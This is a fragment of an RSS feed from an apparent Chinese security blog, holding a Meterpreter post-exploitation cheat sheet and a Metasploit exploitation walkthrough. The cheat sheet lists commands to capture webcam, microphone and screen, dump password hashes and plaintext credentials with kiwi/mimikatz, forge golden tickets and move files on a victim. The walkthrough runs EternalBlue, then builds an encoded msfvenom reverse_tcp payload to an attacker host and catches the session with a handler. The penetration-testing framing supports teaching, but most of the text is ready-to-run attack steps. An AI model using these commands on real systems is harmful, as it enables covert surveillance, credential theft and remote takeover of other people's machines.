&lt;p&gt;抓取目标机的屏幕截图：load espia ； screengrab&lt;/p&gt;
&lt;p&gt;获取相机设备：webcam_list&lt;/p&gt;
&lt;p&gt;控制拍照 ：webcam_snap&lt;/p&gt;
&lt;p&gt;直播摄像头：webcam_stream&lt;/p&gt;
&lt;p&gt;控制录音：record_mic&lt;/p&gt;
&lt;p&gt;查看当前处于目标机的那个目录：pwd&lt;/p&gt;
&lt;p&gt;查看当前目录：getlwd&lt;/p&gt;
&lt;p&gt;导出当前用户密码哈希  run hashdump&lt;/p&gt;
&lt;p&gt;用户名：SID：LM 哈希：NTLM 哈希:::&lt;/p&gt;
&lt;p&gt;也可以使用下面这个命令导出 权限更高   run windows/gather/smart_hashdump&lt;/p&gt;
&lt;p&gt;抓取自动登录的用户名和密码  run windows/gather/credentials/windows_autologin&lt;/p&gt;
&lt;p&gt;直接获取明文密码（注意这个功能需要获取系统权限  获取系统权限需要输入 getsystem）&lt;/p&gt;
&lt;p&gt;首选终端输入  load kiwi    加载 kiwi&lt;/p&gt;
&lt;p&gt;creds_all：列举所有凭据&lt;br&gt;
 creds_kerberos：列举所有 kerberos 凭据&lt;br&gt;
 creds_msv：列举所有 msv 凭据&lt;br&gt;
 creds_ssp：列举所有 ssp 凭据&lt;br&gt;
 creds_tspkg：列举所有 tspkg 凭据&lt;br&gt;
 creds_wdigest：列举所有 wdigest 凭据&lt;br&gt;
 dcsync：通过 DCSync 检索用户帐户信息&lt;br&gt;
 dcsync_ntlm：通过 DCSync 检索用户帐户 NTLM 散列、SID 和 RID&lt;br&gt;
golden_ticket_create：创建黄金票据&lt;br&gt;
 kerberos_ticket_list：列举 kerberos 票据&lt;br&gt;
 kerberos_ticket_purge：清除 kerberos 票据&lt;br&gt;
 kerberos_ticket_use：使用 kerberos 票据&lt;br&gt;
 kiwi_cmd：执行 mimikatz 的命令，后面接 mimikatz.exe 的命令&lt;br&gt;
 lsa_dump_sam：dump 出 lsa 的 SAM&lt;br&gt;
lsa_dump_secrets：dump 出 lsa 的密文&lt;br&gt;
 password_change：修改密码&lt;br&gt;
 wifi_list：列出当前用户的 wifi 配置文件&lt;br&gt;
 wifi_list_shared：列出共享 wifi 配置文件 / 编码&lt;/p&gt;
&lt;h2 id=&#34;3文件系统命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3文件系统命令&#34;&gt;#&lt;/a&gt; 3. 文件系统命令&lt;/h2&gt;
&lt;p&gt;cat c:\boot.ini# 查看文件内容，文件必须存在&lt;br&gt;
 del c:\boot.ini #删除指定的文件&lt;br&gt;
 upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如 upload  setup.exe C:\windows\system32&lt;br&gt;
download nimeia.txt/root/Desktop/   # 下载文件到本机上如：download C:\boot.ini/root / 或者 download C:\&amp;quot;ProgramFiles&amp;quot;\Tencent\QQ\Users\295****&lt;em&gt;&lt;em&gt;125\Msg2.0.db /root/&lt;br&gt;
edit c:\boot.ini  # 编辑文件&lt;br&gt;
 getlwd# 打印本地目录&lt;br&gt;
 getwd# 打印工作目录&lt;br&gt;
 lcd# 更改本地目录&lt;br&gt;
 ls# 列出在当前目录中的文件列表&lt;br&gt;
 lpwd# 打印本地目录&lt;br&gt;
 pwd# 输出工作目录&lt;br&gt;
 cd c:\ #进入目录文件下&lt;br&gt;
 rm file #删除文件&lt;br&gt;
 mkdir dier #在受害者系统上的创建目录&lt;br&gt;
 rmdir# 受害者系统上删除目录&lt;br&gt;
 dir# 列出目标主机的文件和文件夹信息&lt;br&gt;
 mv# 修改目标主机上的文件名&lt;br&gt;
 search -d d:\www -f web.config #search 文件，如 search  -d c:\  -f&lt;/em&gt;.doc&lt;br&gt;
meterpreter &amp;gt; search -f autoexec.bat  #搜索文件&lt;br&gt;
 meterpreter &amp;gt; search -f sea&lt;/em&gt;.bat c:\xamp\&lt;br&gt;
enumdesktops     #用户登录数&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/msfconsole%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B/</guid>
            <title>msfconsole漏洞利用流程</title>
            <link>https://mangpumo.github.io/2023/01/12/msfconsole%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B/</link>
            <pubDate>Thu, 12 Jan 2023 03:46:27 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;一-阶段划分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-阶段划分&#34;&gt;#&lt;/a&gt; 一、阶段划分：&lt;/h1&gt;
&lt;p&gt;漏洞利用分为 前期交互   情报搜集 威胁建模  漏洞分析。渗透利用  后渗透利用 报告 这几个阶段&lt;/p&gt;
&lt;h2 id=&#34;1前期交互阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1前期交互阶段&#34;&gt;#&lt;/a&gt; 1. 前期交互阶段：&lt;/h2&gt;
&lt;p&gt;与客户组织进行交互讨论，确定范围，目标等&lt;/p&gt;
&lt;p&gt;​         这个阶段大家可以理解为情报收集前阶段，主要是为了找到目标 确认范围&lt;/p&gt;
&lt;p&gt;![1643165117094](10-11  msfconsole 漏洞利用流程.assets/1643165117094.png)&lt;/p&gt;
&lt;h2 id=&#34;2情报搜集阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2情报搜集阶段&#34;&gt;#&lt;/a&gt; 2. 情报搜集阶段：&lt;/h2&gt;
&lt;p&gt;获取更多目标组织信息，&lt;/p&gt;
&lt;p&gt;|          外围信息搜索   -    Google&lt;/p&gt;
&lt;p&gt;![1643165139006](10-11  msfconsole 漏洞利用流程.assets/1643165139006.png)&lt;/p&gt;
&lt;p&gt;​          主机探测与端口扫描         如 -Nmap&lt;/p&gt;
&lt;p&gt;​           服务扫描       利用 metasploit 中的 auxiliary/scanner/ 中的服务扫描模块，可以对靶机中的服务版本等信息进行扫描&lt;/p&gt;
&lt;p&gt;​            网络漏洞扫描   -OpenVAS、Nessus 等&lt;/p&gt;
&lt;p&gt;​             其他工具扫描  py 脚本扫描&lt;/p&gt;
&lt;h2 id=&#34;3威胁建模阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3威胁建模阶段&#34;&gt;#&lt;/a&gt; 3. 威胁建模阶段：&lt;/h2&gt;
&lt;p&gt;理清头绪，确定出最可行的漏洞利用通道，这个建模阶段写的文档不是给自己看的 是给整个团队看的 方便多人合作&lt;/p&gt;
&lt;p&gt;![1643165166875](10-11  msfconsole 漏洞利用流程.assets/1643165166875.png)&lt;/p&gt;
&lt;p&gt;​           这个阶段主要是根据收集到的情报进行整理 ，理清漏洞利用思路。&lt;/p&gt;
&lt;h2 id=&#34;4漏洞分析阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4漏洞分析阶段&#34;&gt;#&lt;/a&gt; 4. 漏洞分析阶段：&lt;/h2&gt;
&lt;p&gt;搜索可获取的渗透代码资源&lt;/p&gt;
&lt;p&gt;![1643165182827](10-11  msfconsole 漏洞利用流程.assets/1643165182827.png)&lt;/p&gt;
&lt;p&gt;​           这个阶段主要 挑选匹配可能存在的漏洞利用模块，shellcode&lt;/p&gt;
&lt;h2 id=&#34;5渗透利用阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5渗透利用阶段&#34;&gt;#&lt;/a&gt; 5. 渗透利用阶段：&lt;/h2&gt;
&lt;p&gt;找出安全漏洞，入侵系统&lt;/p&gt;
&lt;p&gt;​          这个阶段尝试利用漏洞 ，配置监控，开始漏洞利用&lt;/p&gt;
&lt;h2 id=&#34;6后渗透利用阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#6后渗透利用阶段&#34;&gt;#&lt;/a&gt; 6. 后渗透利用阶段：&lt;/h2&gt;
&lt;p&gt;Meterpreter，实施操作&lt;/p&gt;
&lt;p&gt;​            这个阶段 就开始实施相关数据下载 后门维持  提权等操作&lt;/p&gt;
&lt;h2 id=&#34;7报告阶段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#7报告阶段&#34;&gt;#&lt;/a&gt; 7. 报告阶段：&lt;/h2&gt;
&lt;p&gt;漏洞利用渗透测试报告  （详细报告编写看 渗透测试报告课程）&lt;/p&gt;
&lt;p&gt;![1643165204135](10-11  msfconsole 漏洞利用流程.assets/1643165204135.png)&lt;/p&gt;
&lt;p&gt;|             这个阶段主要是对本次渗透进行总结，概述总体上包括 时间、人员、漏洞利用范围、技术手段等等。我们需要在这部分确定漏洞利用执行的时间范围、参与漏洞利用的人员及联系方式、约定的漏洞利用范围和一些漏洞利用过程中采用的技术、工具描述。写清  前期交互   情报搜集 威胁建模  漏洞分析。渗透利用  后渗透利用  漏洞利用结果 安全建议 等内容&lt;/p&gt;
&lt;p&gt;在撰写的过程中，需要特别注意的是：漏洞描述切忌不可过于简单，一笔带过；在安全建议部分避免提出没有实际意义的安全建议，比如加强安全意识；报告结构混乱不堪，太多复杂的专业术语，比如绕狗、x 站等等；&lt;/p&gt;
&lt;h1 id=&#34;二-实际操作举例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-实际操作举例&#34;&gt;#&lt;/a&gt; 二、实际操作（举例）&lt;/h1&gt;
&lt;p&gt;主机范围和目标已确定&lt;/p&gt;
&lt;p&gt;1 情报搜集&lt;/p&gt;
&lt;p&gt;基于 msf 发现内网存活主机&lt;/p&gt;
&lt;p&gt;search 搜索&lt;/p&gt;
&lt;p&gt;msf 终端内输入 search scanner type:auxiliary&lt;/p&gt;
&lt;p&gt;可用于发现主机的模块&lt;/p&gt;
&lt;p&gt;auxiliary/scanner/discovery/arp_sweep # 基于 ARP 发现内网存活主机&lt;/p&gt;
&lt;p&gt;auxiliary/scanner/discovery/udp_sweep # 基于 UDP 发现内网存活主机&lt;/p&gt;
&lt;p&gt;auxiliary/scanner/ftp/ftp_version # 发现 FTP 服务&lt;/p&gt;
&lt;p&gt;auxiliary/scanner/http/http_version # 发现 HTTP 服务&lt;/p&gt;
&lt;p&gt;auxiliary/scanner/smb/smb_version # 基于 smb 发现内网存活主机&lt;/p&gt;
&lt;p&gt;基于 netbios 发现内网存活主机&lt;/p&gt;
&lt;p&gt;基于 snmap 发现内网存活主机&lt;/p&gt;
&lt;p&gt;基于 ICMP 发现内网存活主机&lt;/p&gt;
&lt;p&gt;2  威胁建模&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;经过第一步情报收集 我们通过 arp 发现了 目标机器 ip&lt;/p&gt;
&lt;p&gt;然后通过对目标机器的 ip 扫描  我们知道了  目标机器开通了 80 端口  有 web 服务  开了 ftp 端口  有文件服务&lt;/p&gt;
&lt;p&gt;开了 smb&lt;/p&gt;
&lt;p&gt;最终决定对 smb 相关的漏洞进行利用&lt;/p&gt;
&lt;p&gt;备选方案通过植入木马的方式进行利用&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;3   漏洞分析&lt;/p&gt;
&lt;p&gt;第一步先查看 smb 利用漏洞有哪些  比如永恒之蓝&lt;/p&gt;
&lt;p&gt;1 查询 msf 与永恒之蓝相关的 模块&lt;/p&gt;
&lt;p&gt;使用命令    search ms17_010&lt;/p&gt;
&lt;p&gt;2 然后我们利用了一个永恒之蓝的 扫描模块&lt;/p&gt;
&lt;p&gt;use auxiliary/scanner/smb/smb_ms17_010&lt;/p&gt;
&lt;p&gt;3  输入  options  查看扫描模块需要配置的参数&lt;/p&gt;
&lt;p&gt;3.1 然后我们配置了 rhost  （rhost 指的是目标主机 ip）&lt;/p&gt;
&lt;p&gt;set rhost   ip&lt;/p&gt;
&lt;p&gt;4 然后我们执行扫描 输入  run&lt;/p&gt;
&lt;p&gt;发现了 可能存在漏洞的主机&lt;/p&gt;
&lt;p&gt;4  渗透利用&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;1 加载 永恒之蓝漏洞利用模块&lt;/p&gt;
&lt;p&gt;use exploit/windows/smb/ms17_010_eternalblue&lt;/p&gt;
&lt;p&gt;2  输入  options  查看扫描模块需要配置的参数&lt;/p&gt;
&lt;p&gt;3.1 然后我们配置了 rhost  （rhost 指的是目标主机 ip）&lt;/p&gt;
&lt;p&gt;set rhost   ip&lt;/p&gt;
&lt;p&gt;3.2 然后我们配置了  lhost （lhost 指的是  监控主机或攻击机 ip）&lt;/p&gt;
&lt;p&gt;set lhost   ip&lt;/p&gt;
&lt;p&gt;3.3 然后我们配置了 lport  （指的是监控的端口 ）&lt;/p&gt;
&lt;p&gt;set lport   ip&lt;/p&gt;
&lt;p&gt;注意端口必须没有被占用&lt;/p&gt;
&lt;p&gt;4 然后我们执行扫描 输入  run 执行永恒之蓝漏洞利用&lt;/p&gt;
&lt;p&gt;但是发现失败  提示 模块已经利用了  但是没有返回对应 session&lt;/p&gt;
&lt;p&gt;![image.png](10-11  msfconsole 漏洞利用流程.assets/bffdb79061ad4b0aa92d2dfde83e9f1b.png)&lt;/p&gt;
&lt;p&gt;5  备选方案通过植入木马的方式进行利用&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;1  我们知道目标机器是 win 系统  所以使用 msfvenom  生成一个 win 平台的木马&lt;/p&gt;
&lt;p&gt;msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp&lt;/p&gt;
&lt;p&gt;LHOST=192.168.3.33 LPORT=4446 -e x86/shikata_ga_nai -b &#39;\x00\x0a\xff&#39; -i 10  -f exe -o payload.exe&lt;/p&gt;
&lt;p&gt;2 漏洞生成后  通过启动一个 py 服务将木马上传到目标机器&lt;/p&gt;
&lt;p&gt;python -m SimpleHTTPServer 80&lt;/p&gt;
&lt;p&gt;3 配置监控程序我们使用了&lt;/p&gt;
&lt;p&gt;use exploit/multi/handler&lt;/p&gt;
&lt;p&gt;3 输入 options 进入配置&lt;/p&gt;
&lt;p&gt;3.1 然后我们配置了  lhost （lhost 指的是  监控主机或攻击机 ip）&lt;/p&gt;
&lt;p&gt;set lhost   ip&lt;/p&gt;
&lt;p&gt;3.2 然后我们配置了 lport  （指的是监控的端口 ）&lt;/p&gt;
&lt;p&gt;set lport   ip&lt;/p&gt;
&lt;p&gt;注意端口必须和 msfvenom 生成的木马端口一样才行&lt;/p&gt;
&lt;p&gt;4 配置攻击载荷 payload&lt;/p&gt;
&lt;p&gt;set payload windows/meterpreter/reverse_tcp&lt;/p&gt;
&lt;p&gt;5 执行利用等待目标机器执行木马&lt;/p&gt;
&lt;p&gt;6 目标机器执行了木马&lt;/p&gt;
&lt;p&gt;利用成功并获得 meterpreter&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;5  后渗透利用&lt;/p&gt;
&lt;p&gt;进入新文档&lt;/p&gt;
&lt;p&gt;6  报告阶段&lt;/p&gt;
 ]]></description>
        </item>
    </channel>
</rss>
